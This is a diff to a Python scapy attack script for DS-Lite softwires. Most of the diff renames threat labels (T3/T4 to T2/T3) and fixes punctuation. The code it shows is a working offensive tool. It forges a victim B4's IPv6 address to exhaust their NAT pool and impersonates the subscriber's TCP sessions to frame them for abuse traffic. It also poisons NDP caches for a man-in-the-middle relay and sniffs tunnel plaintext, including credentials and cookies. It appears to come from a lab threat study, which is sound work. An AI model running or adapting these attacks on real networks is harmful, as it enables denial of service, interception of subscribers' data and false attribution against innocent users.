@@ -1,30 +1,30 @@
 #!/usr/bin/python
-# T3 - Softwire Endpoint Spoofing & On-Path MITM (poison both endpoints, relay)
-# T4 - Unencrypted Tunnel Traffic Interception (read the softwire plaintext)
+# T2 – Softwire Endpoint Spoofing & On-Path MITM (poison both endpoints, relay)
+# T3 – Unencrypted Tunnel Traffic Interception (read the softwire plaintext)
 #
 # DS-Lite relies on the B4's IPv6 source address (Softwire-ID) to identify
 # subscribers. There is NO cryptographic authentication of this address.
 # An attacker within the IPv6 ISP network can:
 #
-#   T3 (spoof): Forge packets with a victim B4's IPv6 source address,
+#   T2 (spoof): Forge packets with a victim B4's IPv6 source address,
 #      causing AFTR to attribute attacker traffic to the victim subscriber.
 #      Use cases: traffic misdirection, attribution evasion, service theft.
 #
-#   T4 (sniff): Capture all IPv6 softwire traffic on the ISP L2 segment.
+#   T3 (sniff): Capture all IPv6 softwire traffic on the ISP L2 segment.
 #      Since tunnels are unencrypted, the attacker sees all IPv4 content
 #      encapsulated inside IPv6 packets between B4 and AFTR.
 #
 # Attacker position: ISP network (2001:db8:cafe::/64)
 #
 # Usage:
-#   # T3 - spoof B4-1's identity, inject TCP traffic:
+#   # T2 – spoof B4-1's identity, inject TCP traffic:
 #   python3 tunnel_spoof.py spoof --interface eth-isp \
 #       --src-ip6 2001:db8:cafe::150 --victim-b4-ip6 <B4-1-IPv6> \
 #       --aftr-ip6 2001:db8:cafe::10 \
 #       --inner-src-ip4 10.0.1.50 --inner-dst-ip4 198.51.100.2 \
 #       --proto tcp --count 20
 #
-#   # T4 - passive sniff of all softwire traffic:
+#   # T3 – passive sniff of all softwire traffic:
 #   python3 tunnel_spoof.py sniff --interface eth-isp \
 #       --aftr-ip6 2001:db8:cafe::10 --output-pcap /tmp/softwire.pcap
 import argparse
@@ -74,7 +74,7 @@ def ndp_resolve(iface, target_ip6, src_ip6=None):
     return "ff:ff:ff:ff:ff:ff"  # fallback: broadcast
 
 
-# ── T3: SPOOF MODE ────────────────────────────────────────────────────────
+# ── T2: SPOOF MODE ────────────────────────────────────────────────────────
 
 def build_spoofed_pkt(src_ip6, victim_b4_ip6, aftr_ip6,
                       inner_src4, inner_dst4, proto, sport, dport, dmac):
@@ -111,11 +111,11 @@ def build_spoofed_pkt(src_ip6, victim_b4_ip6, aftr_ip6,
 
 
 def run_spoof(args):
-    """T3: Send spoofed 4-in-6 packets impersonating victim B4.
+    """T2: Send spoofed 4-in-6 packets impersonating victim B4.
 
     Impact: attacker's traffic consumes victim B4's NAT port pool.
     Once the pool is exhausted, the real victim cannot create new
-    connections - effective denial of service via identity theft.
+    connections — effective denial of service via identity theft.
     """
     iface = args.interface
     import random
@@ -149,7 +149,7 @@ def run_spoof(args):
 
     print()
     print("=" * 64)
-    print("  T3 - Softwire Endpoint Spoofing & On-Path MITM (Softwire-ID Forgery)")
+    print("  T2 – Softwire Endpoint Spoofing & On-Path MITM (Softwire-ID Forgery)")
     print("=" * 64)
     print()
     print("  Scenario")
@@ -186,7 +186,7 @@ def run_spoof(args):
     print(f"[*] AFTR MAC: {dmac}")
     print()
 
-    # Build batches of spoofed packets - each with a unique inner-src-IP
+    # Build batches of spoofed packets — each with a unique inner-src-IP
     # and random ports to create maximum distinct NAT bindings.
     # Uses the victim's inner IPv4 subnet (e.g. 10.0.1.0/24) as source
     # range so AFTR routes them through the victim's tunnel/pool.
@@ -257,7 +257,7 @@ def run_spoof(args):
     print("  Client1: curl http://198.51.100.2  (should fail/timeout)")
 
 
-# ── T4: SNIFF MODE ────────────────────────────────────────────────────────
+# ── T3: SNIFF MODE ────────────────────────────────────────────────────────
 
 def _extract_inner_ip(pkt):
     """Extract inner IPv4 from a softwire packet, handling both raw (nh=4)
@@ -274,7 +274,7 @@ def _extract_inner_ip(pkt):
         # by checking that it comes after the IPv6 layer in the stack
         candidate = pkt[IP]
         if candidate.underlayer is not None and not candidate.underlayer.haslayer(IPv6):
-            pass  # outer IP - fall through to manual parse
+            pass  # outer IP — fall through to manual parse
         else:
             return candidate
 
@@ -352,7 +352,7 @@ def packet_handler(pkt):
 
 
 def run_sniff(args):
-    """T4: Passive capture of all 4-in-6 softwire traffic."""
+    """T3: Passive capture of all 4-in-6 softwire traffic."""
     iface = args.interface
     # Capture both directions: B4→AFTR (subscriber traffic) and AFTR→B4 (server replies)
     # ip6tnl uses Destination Options header (proto 60) so we filter by host, not proto 4
@@ -363,7 +363,7 @@ def run_sniff(args):
 
     print()
     print("=" * 64)
-    print("  T4 - Unencrypted Tunnel Traffic Interception")
+    print("  T3 – Unencrypted Tunnel Traffic Interception")
     print("=" * 64)
     print()
     print("  Scenario")
@@ -375,7 +375,7 @@ def run_sniff(args):
     print("  What this attack does")
     print("  ---------------------")
     print("  DS-Lite tunnels (IPv4-in-IPv6) carry subscriber traffic in")
-    print("  plaintext - RFC 6333 does not mandate encryption.  Any node")
+    print("  plaintext — RFC 6333 does not mandate encryption.  Any node")
     print("  on the ISP L2 segment between B4 and AFTR can passively")
     print("  capture all encapsulated IPv4 traffic: HTTP, DNS, credentials,")
     print("  session cookies, and any other unencrypted application data.")
@@ -458,7 +458,7 @@ def run_sniff(args):
     print("  - L2 segment isolation (prevent attacker ISP placement)")
 
 
-# ── T3 (developed): full bidirectional session impersonation ────────────────
+# ── T2 (developed): full bidirectional session impersonation ────────────────
 # The plain spoof only injects one-way traffic. On the shared carrier segment the
 # attacker also SEES the AFTR's de-NAT'd reply toward the victim B4 (it is sent to
 # ::b4N on the same L2). So the attacker can run a complete raw TCP state machine
@@ -469,10 +469,10 @@ def run_sniff(args):
 #     (victim's conntrack zone/mark, victim's share of the public IPv4);
 #   * any payload the attacker pushes (here an HTTP request that doubles as the
 #     abuse pattern) is logged by the operator's per-binding attribution
-#     (RFC 6333 11) against the INNOCENT victim -- T3 frames a specific
-#     subscriber, where T2 only taints the whole shared pool.
+#     (RFC 6333 11) against the INNOCENT victim -- T2 frames a specific
+#     subscriber, where TS1 only taints the whole shared pool.
 def run_impersonate(args):
-    """T3-impersonate: open a real bidirectional TCP session AS the victim B4,
+    """T2-impersonate: open a real bidirectional TCP session AS the victim B4,
     then push attacker payload over it (attributed to the victim)."""
     import struct as _struct
     sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -487,7 +487,7 @@ def run_impersonate(args):
     seq = random.randint(1, 0xFFFFFFFE)
 
     print("\n" + "=" * 64)
-    print("  T3-IMPERSONATE - bidirectional session as the victim B4")
+    print("  T2-IMPERSONATE - bidirectional session as the victim B4")
     print("=" * 64)
     print(f"  forging victim {victim}  ->  AFTR {aftr}")
     print(f"  session: inner {inner4}:{sport} -> {dst4}:{dport}  (as the victim)")
@@ -544,7 +544,7 @@ def _build_psh(src_ip6, aftr_ip6, inner4, dst4, sport, dport, seq, ack, data, dm
     return bytes(pkt)
 
 
-# ── T3 (developed): true MITM via sustained NDP cache poisoning ──────────────
+# ── T2 (developed): true MITM via sustained NDP cache poisoning ──────────────
 # The AFTR reaches a victim B4 (::b4N) by L2-resolving it via NDP on the carrier
 # segment. RFC 4861 7.2.5 lets an *override* Neighbor Advertisement update that
 # cache entry. A single poison is reverted by NUD when the real B4 answers the
@@ -553,7 +553,7 @@ def _build_psh(src_ip6, aftr_ip6, inner4, dst4, sport, dport, seq, ack, data, dm
 #
 # Effect (verified): the AFTR's de-NAT'd return traffic for the victim is now
 # delivered to the ATTACKER, not the real B4. The attacker is on-path for the
-# inbound direction; combined with T3 forge-to-send (outbound), that is full
+# inbound direction; combined with T2 forge-to-send (outbound), that is full
 # bidirectional MITM. The real B4 is cut out, so the victim also loses
 # connectivity (a DoS side effect) and there is no RST race.
 #
@@ -570,7 +570,7 @@ def _own_mac(iface):
 
 
 def run_mitm(args):
-    """T3-mitm: hold the AFTR's NDP cache for the victim B4 via sustained override
+    """T2-mitm: hold the AFTR's NDP cache for the victim B4 via sustained override
     NAs, intercepting the AFTR's return traffic (true MITM + victim DoS)."""
     from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
     from scapy.sendrecv import sendp as _sendp
@@ -586,7 +586,7 @@ def run_mitm(args):
         print(f"[!] could not NDP-resolve the AFTR ({aftr}); is it reachable?"); return 1
 
     print("\n" + "=" * 64)
-    print("  T3-MITM - sustained NDP poison -> AFTR return-path interception")
+    print("  T2-MITM - sustained NDP poison -> AFTR return-path interception")
     print("=" * 64)
     print(f"  victim B4 {victim}  |  AFTR {aftr} ({aftrmac})  |  attacker MAC {amac}")
     print(f"  flooding override NAs (::b4N -> attacker) for {args.duration}s ...")
@@ -641,7 +641,7 @@ def run_mitm(args):
 
 
 def run_relay(args):
-    """T3 softwire MITM (positioning + relay ONLY - reading is T4): poison both
+    """T2 softwire MITM (positioning + relay ONLY - reading is T3): poison both
     neighbour caches so the AFTR believes the attacker is the B4 and the B4
     believes the attacker is the AFTR, then forward in the middle.
 
@@ -649,11 +649,11 @@ def run_relay(args):
       downstream AFTR --(::10 > ::b41)--> [poisoned: goes to attacker] --> real B4
 
     This mode only PLACES the attacker on-path and keeps the victim served; it
-    does NOT inspect payloads. To READ the intercepted plaintext, run the T4
+    does NOT inspect payloads. To READ the intercepted plaintext, run the T3
     `sniff` mode alongside it (the unencrypted-tunnel interception attack). The
-    MITM is what gives an attacker on a SWITCHED segment the access that T4
+    MITM is what gives an attacker on a SWITCHED segment the access that T3
     otherwise only has on a shared/flooding segment; it also enables active
-    tampering (drop / redirect / modify), which passive T4 cannot do.
+    tampering (drop / redirect / modify), which passive T3 cannot do.
 
     TWO forwarders:
       --kernel  (RECOMMENDED): the attacker's KERNEL forwards at line rate.
@@ -701,7 +701,7 @@ def run_relay(args):
     poison_b4   = _na(aftr, victim, b4mac)    # B4:   ::10  -> us
 
     print("\n" + "=" * 64)
-    print("  T3-RELAY - full softwire MITM (poison both ways + forward)")
+    print("  T2-RELAY - full softwire MITM (poison both ways + forward)")
     print("=" * 64)
     print(f"  victim B4 {victim} ({b4mac})  |  AFTR {aftr} ({aftrmac})")
     print(f"  attacker {amac}  -- relaying for {args.duration}s ...")
@@ -752,8 +752,8 @@ def run_relay(args):
             _run("nft delete table ip6 mitmquiet")
         print(f"\n  [+] held the MITM for {args.duration}s ({sent} override NAs)")
         print("  victim stayed served while every frame transited the attacker.")
-        print("  To READ the intercepted plaintext, run the T4 `sniff` mode now")
-        print("  (the MITM only positions+relays; reading the softwire is T4).")
+        print("  To READ the intercepted plaintext, run the T3 `sniff` mode now")
+        print("  (the MITM only positions+relays; reading the softwire is T3).")
         print("  Stop and the caches revert (NUD) - victim continues normally.")
         return 0
 
@@ -804,11 +804,11 @@ def run_relay(args):
         pass
     stop_ev.set()
 
-    # T3 is the MITM (positioning + relay) ONLY. Reading the now-intercepted
-    # plaintext is the T4 attack - run `tunnel_spoof.py sniff` to do that.
+    # T2 is the MITM (positioning + relay) ONLY. Reading the now-intercepted
+    # plaintext is the T3 attack - run `tunnel_spoof.py sniff` to do that.
     print(f"\n  [+] relayed {up} upstream + {down} downstream softwire frames")
     print("  NOTE: this userspace relay is LOSSY - prefer --kernel for a stable MITM.")
-    print("  To READ the intercepted traffic, run the T4 sniff mode alongside this.")
+    print("  To READ the intercepted traffic, run the T3 sniff mode alongside this.")
     return 0
 
 
@@ -816,7 +816,7 @@ def run_relay(args):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T3 Softwire Endpoint Spoofing & On-Path MITM / T4 Unencrypted-Tunnel Interception\n"
+        description="T2 Softwire Endpoint Spoofing & On-Path MITM / T3 Unencrypted-Tunnel Interception\n"
                     "Operates on the IPv6 ISP network segment between B4 and AFTR.",
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
@@ -824,7 +824,7 @@ def main():
 
     # ── spoof sub-command ──────────────────────────────────────────────
     sp = sub.add_parser('spoof',
-        help='T3: Forge victim B4 IPv6 src to impersonate subscriber')
+        help='T2: Forge victim B4 IPv6 src to impersonate subscriber')
     sp.add_argument('--interface', required=True,
                     help='Network interface on ISP segment (e.g. eth-isp)')
     sp.add_argument('--src-ip6', required=True,
@@ -862,9 +862,9 @@ def main():
     sp.add_argument('--focus-sport', type=int, default=40000,
                     help='Fixed inner source port for --focused (default 40000)')
 
-    # ── impersonate sub-command (developed T3) ─────────────────────────
+    # ── impersonate sub-command (developed T2) ─────────────────────────
     im = sub.add_parser('impersonate',
-        help='T3+: open a real bidirectional TCP session AS the victim B4 '
+        help='T2+: open a real bidirectional TCP session AS the victim B4 '
              '(forge to send, sniff AFTR return to receive) and push abuse')
     im.add_argument('--interface', required=True, help='ISP segment interface')
     im.add_argument('--src-ip6', required=True,
@@ -883,9 +883,9 @@ def main():
     im.add_argument('--abuse-path', default='malware.exe',
                     help='Path in the framing HTTP request (default: malware.exe)')
 
-    # ── mitm sub-command (developed T3) ─────────────────────────────────
+    # ── mitm sub-command (developed T2) ─────────────────────────────────
     mm = sub.add_parser('mitm',
-        help='T3++: true MITM via sustained NDP poison - intercept the AFTR '
+        help='T2++: true MITM via sustained NDP poison - intercept the AFTR '
              'return path for a victim B4 (also DoSes the victim)')
     mm.add_argument('--interface', required=True, help='ISP segment interface')
     mm.add_argument('--src-ip6', required=True,
@@ -905,7 +905,7 @@ def main():
 
     # ── relay sub-command (full MITM: poison both ways + forward) ───────
     rl = sub.add_parser('relay',
-        help='T3 full MITM: poison BOTH softwire directions and FORWARD frames '
+        help='T2 full MITM: poison BOTH softwire directions and FORWARD frames '
              'so the victim still works (200) while the attacker reads the cleartext')
     rl.add_argument('--interface', required=True, help='ISP segment interface')
     rl.add_argument('--src-ip6', required=True, help="Attacker's real IPv6 (NDP only)")
@@ -925,7 +925,7 @@ def main():
 
     # ── sniff sub-command ──────────────────────────────────────────────
     sn = sub.add_parser('sniff',
-        help='T4: Passively capture all softwire traffic in plaintext')
+        help='T3: Passively capture all softwire traffic in plaintext')
     sn.add_argument('--interface', required=True,
                     help='Network interface on ISP segment (e.g. eth-isp)')
     sn.add_argument('--aftr-ip6', default='2001:db8:cafe::10',
